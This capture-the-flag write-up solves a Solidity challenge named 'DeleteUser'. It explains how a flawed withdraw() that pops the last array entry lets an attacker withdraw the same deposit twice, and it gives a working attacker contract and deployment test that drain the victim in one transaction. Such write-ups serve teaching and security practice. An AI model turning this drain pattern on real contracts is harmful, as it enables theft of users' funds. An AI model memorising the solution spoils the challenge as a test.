# DeleteUser

## Goals

=> Drain the victimContracts balance to 0
=> Must exploit one transaction

### Hints

- None

### Solution

- The vulnerability lies in the business logic of the `withdraw()` function, we can just deposit an amount X and then an amount Y which should be less than X, since after withdrawing at index 1 (amount X), the last user in the array (index 2) gets popped, that means we can withdraw at index 1 again (for amount X) just combine those transactions in the constructor of a contract and then send all the eth back to the player to drain the contract within one transaction.

### Attacker Contract

```solidity
contract DeleteUserAttacker {
    DeleteUser target;
    address payable player;

    constructor(address _target, address _player) payable {
        target = DeleteUser(_target);
        player = payable(_player);
        target.deposit{value: 2 ether}();
        target.deposit{value: 1 ether}();
        target.withdraw(1);
        target.withdraw(1);
        uint256 balance = address(this).balance;
        (bool success, ) = player.call{value: balance}("");
        require(success, "Call to player failed");
    }
}
```

### Test

```javascript
it('conduct your attack here', async function () {
	const AttackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
	const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(
		victimContract.address,
		attackerWallet.address,
		{
			value: ethers.utils.parseUnits('3'),
		}
	);
});
```
